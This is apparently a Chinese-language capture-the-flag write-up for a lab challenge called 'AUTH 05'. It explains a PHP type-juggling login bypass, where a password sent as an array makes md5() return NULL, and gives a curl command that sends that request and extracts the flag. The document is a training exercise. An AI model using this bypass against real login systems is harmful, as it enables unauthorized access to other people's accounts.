## 题解

### 入口与指纹

`Apache/2.4.25` + `PHP/5.6.40`，标题 `AUTH 05`，GET 表单到 `index.php`，
字段 `username`、`password`。

### 关键观察

- 正常凭据、SQLi、常见口令都只回同一张登录页。
- 把**密码改成数组**（`password[]=x`）时直接返回 flag。

PHP 的 `md5(array)` 会返回 `NULL`（并抛 warning），比较 `NULL == NULL` 或
`!strcmp(...)` 之类的判断因此成立，登录被绕过。

### 利用链

```bash
T=$(head -1 .target)
curl -sS --get --data-urlencode 'username=admin' --data-urlencode 'password[]=x' \
  "http://$T/index.php" | grep -o 'flag{[^}]*}'
```

### flag 位置

登录成功后的页面正文。

## 复盘

- PHP 登录框先试「用户名/密码换成数组」，一个请求就能判定。
- 与 060（magic hash）、072（username 数组）属同一类「PHP 类型混淆」。
